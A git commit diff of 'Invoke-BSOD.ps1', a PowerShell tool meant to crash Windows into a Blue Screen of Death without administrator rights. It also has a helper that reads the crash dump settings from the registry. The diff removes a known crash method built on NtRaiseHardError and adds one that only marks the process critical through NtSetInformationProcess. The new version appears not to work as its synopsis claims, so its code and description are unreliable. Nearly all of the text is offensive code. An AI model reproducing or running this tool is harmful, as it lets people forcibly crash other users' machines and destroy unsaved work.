22730c59ae674556532c7ec8a9f7f4e2ab69cd00
Taylor Christian Newsome <86472964+SleepTheGod@users.noreply.github.com>
2025-01-09 04:25:41 -0500

    Update Invoke-BSOD.ps1

--- Invoke-BSOD.ps1
+++ Invoke-BSOD.ps1
@@ -1,17 +1,15 @@
 function Invoke-BSOD {
 <#
 .SYNOPSIS
-
 Invokes a Blue Screen of Death on Windows without requiring admin privileges.
 Author:  Barrett Adams (@peewpw)
+Updated By : Taylor Christian Newsome (SleepTheGod)
 
 .DESCRIPTION
-
 Raises an error that causes a Blue Screen of Death on Windows. It does this without
 requiring administrator privileges.
 
 .EXAMPLE
-
 PS>Import-Module .\Invoke-BSOD.ps1
 PS>Invoke-BSOD
    (Blue Screen Incoming...)
@@ -21,60 +19,62 @@ $source = @"
 using System;
 using System.Runtime.InteropServices;
 
-public static class CS{
-	[DllImport("ntdll.dll")]
-	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+public static class BSODInvoker {
+    // Importing NtSetInformationProcess from ntdll.dll
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
 
-	[DllImport("ntdll.dll")]
-	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-	public static unsafe void Kill(){
-		Boolean tmp1;
-		uint tmp2;
-		RtlAdjustPrivilege(19, true, false, out tmp1);
-		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
-	}
+    // Method to trigger BSOD
+    public static void TriggerBSOD() {
+        int status = 1; // Set process to critical status
+        IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
+        int result = NtSetInformationProcess(processHandle, 29, ref status, sizeof(int));
+        if (result != 0) {
+            throw new System.ComponentModel.Win32Exception(result);
+        }
+    }
 }
 "@
-    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
+    # Compiler parameters with unsafe option
+    $comparams = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
     $comparams.CompilerOptions = '/unsafe'
+    $comparams.GenerateInMemory = $true
+
+    # Compile and add the C# code
     $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
-    [CS]::Kill()
+
+    # Invoke the method to trigger BSOD
+    [BSODInvoker]::TriggerBSOD()
 }
 
 function Get-DumpSettings {
 <#
 .SYNOPSIS
-
 Gets the crash dump settings
 Author:  Barrett Adams (@peewpw)
 
 .DESCRIPTION
-
 Queries the registry for crash dump settings so that you'll have some idea
 what type of dump you're going to generate, and where it will be.
 
 .EXAMPLE
-
 PS>Import-Module .\Invoke-BSOD.ps1
-PS>Invoke-BSOD
-   (Blue Screen Incoming...)
-
+PS>Get-DumpSettings
 #>
-	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl
+    $regdata = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\CrashControl
 
-	$dumpsettings = @{}
-	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
-		1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
-		2 {"Kernel Memory Dump"}
-		3 {"Small Memory Dump"}
-		7 {"Automatic Memory Dump"}
-		default {"Unknown"}
-	}
-	$dumpsettings.DumpFileLocation = $regdata.DumpFile
-	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
-	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
-	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
-	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
-	$dumpsettings
+    $dumpsettings = @{}
+    $dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
+        1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
+        2 { "Kernel Memory Dump" }
+        3 { "Small Memory Dump" }
+        7 { "Automatic Memory Dump" }
+        default { "Unknown" }
+    }
+    $dumpsettings.DumpFileLocation = $regdata.DumpFile
+    [bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
+    [bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
+    [bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
+    [bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
+    $dumpsettings
 }
